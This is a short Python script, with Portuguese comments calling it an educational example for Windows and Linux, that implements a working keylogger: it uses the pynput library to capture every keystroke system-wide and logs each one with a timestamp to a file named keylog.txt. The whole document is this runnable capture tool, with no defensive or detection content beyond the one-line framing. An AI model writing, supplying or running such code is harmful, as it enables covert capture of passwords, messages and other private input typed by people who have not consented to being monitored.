# Este código é um exemplo educacional para ambientes Windows/Linux.
# Em dispositivos móveis, o sistema bloqueia a captura global de teclas.

from pynput.keyboard import Listener
import logging

# Configura onde o log será salvo
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), 
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

# Inicia o "escutador" de teclas
with Listener(on_press=on_press) as listener:
    listener.join()
